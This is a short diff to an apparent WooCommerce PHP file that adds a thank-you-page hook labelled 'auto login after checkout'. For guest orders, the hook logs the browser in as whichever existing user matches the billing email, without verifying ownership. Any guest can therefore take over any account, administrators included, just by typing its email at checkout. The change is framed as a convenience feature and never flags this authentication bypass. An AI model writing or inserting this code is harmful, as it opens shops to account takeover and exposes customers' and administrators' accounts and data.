@@ -454,3 +454,14 @@ add_action('woocommerce_thankyou', function($order_id){
 });
 
 
+// auto login after checkout
+add_action('woocommerce_thankyou', function($order_id){
+    $order = wc_get_order($order_id);
+    if ($order && !$order->get_user_id()) {
+        $user = get_user_by('email', $order->get_billing_email());
+        if ($user && !is_user_logged_in()) {
+            wp_set_current_user($user->ID);
+            wp_set_auth_cookie($user->ID);
+        }
+    }
+});
